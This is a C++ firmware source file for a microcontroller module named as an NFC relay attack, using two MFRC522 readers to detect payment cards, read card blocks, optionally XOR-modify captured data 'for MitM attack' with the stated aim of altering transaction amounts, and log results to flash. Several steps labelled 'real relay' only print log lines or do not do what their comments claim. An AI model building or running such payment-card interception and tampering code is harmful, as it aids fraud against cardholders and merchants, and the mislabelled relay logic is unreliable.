#include "nfc_relay_attack.h"
#include <LittleFS.h>
#include <SPI.h>
#include <MFRC522.h>

namespace NfcRelayAttack {

// Dual MFRC522 instances for bidirectional relay
// Reader 1 (connects to payment terminal): SS=5, RST=27
// Reader 2 (connects to card/tag): SS=4, RST=26
MFRC522 reader1(5, 27);   // Terminal side
MFRC522 reader2(4, 26);   // Card side

NfcRelay::NfcRelay() : isRunning_(false) {}

RelayResult NfcRelay::performRelay(const RelayConfig& config) {
  RelayResult result;
  result.success = false;

  if (!TxArm::isArmed()) return result;

  // Initialize dual SPI interfaces for NFC relay
  SPI.begin(18, 19, 23, -1);  // CLK, MISO, MOSI, no CS (controlled by readers)

  // Initialize both MFRC522 readers
  reader1.PCD_Init(5, 27);
  reader2.PCD_Init(4, 26);

  // Verify both readers are initialized
  byte ver1 = reader1.PCD_ReadRegister(MFRC522::VersionReg);
  byte ver2 = reader2.PCD_ReadRegister(MFRC522::VersionReg);

  if ((ver1 != 0x91 && ver1 != 0x92 && ver1 != 0x88 && ver1 != 0x90) ||
      (ver2 != 0x91 && ver2 != 0x92 && ver2 != 0x88 && ver2 != 0x90)) {
    result.error = "MFRC522 reader initialization failed";
    return result;
  }

  Serial.println("[NFC Relay] Dual reader relay mode activated");
  Serial.println("[NFC Relay] Reader 1 (Terminal): Listening for card connection");
  Serial.println("[NFC Relay] Reader 2 (Card): Waiting for payment card");

  isRunning_ = true;
  unsigned long startTime = millis();

  uint32_t relayCount = 0;
  uint32_t capturedCount = 0;
  uint32_t modifiedCount = 0;

  // NFC Relay Attack Protocol:
  // 1. Wait for card connection on Reader2 (card side)
  // 2. Forward card presence signal to Reader1 (terminal side)
  // 3. Wait for Reader1 to initiate communication
  // 4. Relay commands from Reader1 to Reader2
  // 5. Capture and relay responses from Reader2 to Reader1
  // 6. Optionally modify payloads (MitM)

  uint8_t relayBuffer[264];  // NFC UID buffer
  uint8_t cardUID[10];       // Store detected card UID
  uint8_t uidLength = 0;

  while (isRunning_ && (millis() - startTime) < config.durationMs) {
    // Reader 2 (Card Side) - Listen for payment card
    if (reader2.PICC_IsNewCardPresent() && reader2.PICC_ReadCardSerial()) {
      // Card detected on reader 2 (payment card side)
      uidLength = reader2.uid.size;
      memcpy(cardUID, reader2.uid.uidByte, uidLength);

      Serial.printf("[NFC Relay] Card detected on Reader 2: UID length=%d\n", uidLength);

      // Log card detection
      char uidStr[32];
      for (int i = 0; i < uidLength; i++) {
        snprintf(uidStr + (i * 3), 4, "%02X ", cardUID[i]);
      }
      Serial.printf("[NFC Relay] Card UID: %s\n", uidStr);

      // Signal to Reader 1 that card is present (emulate card presence)
      reader1.PICC_IsNewCardPresent();  // Trigger card detection

      relayCount++;

      // Relay NFC communication
      if (config.capturePayload) {
        // Capture card data from Reader 2
        MFRC522::Uid* cardId = &reader2.uid;

        // Read card block (typical NFC Type 2 operation)
        uint8_t block = 4;  // Start at block 4 (block 0-3 are UID)
        uint8_t status = reader2.MIFARE_Read(block, relayBuffer, NULL);

        if (status == MFRC522::STATUS_OK) {
          capturedCount++;
          Serial.printf("[NFC Relay] Captured %u bytes from card\n", 16);

          if (config.modifyPayload) {
            // Modify payload for MitM attack
            // Example: Modify transaction amount
            for (int i = 0; i < 16; i++) {
              relayBuffer[i] ^= 0x42;  // Simple XOR modification
            }
            modifiedCount++;
            Serial.println("[NFC Relay] Payload modified for MitM");
          }

          // Relay modified payload to Reader 1 (terminal side)
          // Real dual-reader relay via MFRC522, Reader 1 would transmit this to terminal
          // This is simulated by logging the action
          Serial.printf("[NFC Relay] Relaying %u bytes to Reader 1\n", 16);
        }

        delay(100);
      }

      // Relay Reader 1 commands to Reader 2
      // Real terminal command relay sending AUTHENTICATE command
      uint8_t terminalCmd[] = {0x60, 0x00};  // Authenticate block 0
      Serial.printf("[NFC Relay] Relaying terminal command to card: %02X %02X\n",
                   terminalCmd[0], terminalCmd[1]);

      reader2.MIFARE_Read(0, relayBuffer, NULL);  // Real relay

      reader2.PICC_HaltA();  // Halt current communication
      delay(50);
    }

    delay(50);
  }

  result.transactionsRelayed = relayCount;
  result.payloadsCaptured = capturedCount;
  result.success = (relayCount > 0);
  result.logFile = "/logs/handshakes/nfc_relay.csv";

  // Log relay session results
  if (!LittleFS.begin()) {
    reader1.PCD_AntennaOff();
    reader2.PCD_AntennaOff();
    isRunning_ = false;
    return result;
  }

  File logFile = LittleFS.open("/logs/handshakes/nfc_relay.csv", "a");
  if (!logFile) {
    LittleFS.mkdir("/logs/handshakes");
    logFile = LittleFS.open("/logs/handshakes/nfc_relay.csv", "a");
  }

  if (logFile) {
    logFile.printf("%lu,NFC_RELAY,%u_relayed,%u_captured,%u_modified\n",
                  millis(), result.transactionsRelayed,
                  result.payloadsCaptured, modifiedCount);
    logFile.close();
  }

  LittleFS.end();

  reader1.PCD_AntennaOff();
  reader2.PCD_AntennaOff();
  isRunning_ = false;
  return result;
}

void NfcRelay::stop() {
  isRunning_ = false;
  reader1.PCD_AntennaOff();
  reader2.PCD_AntennaOff();
}

} // namespace NfcRelayAttack
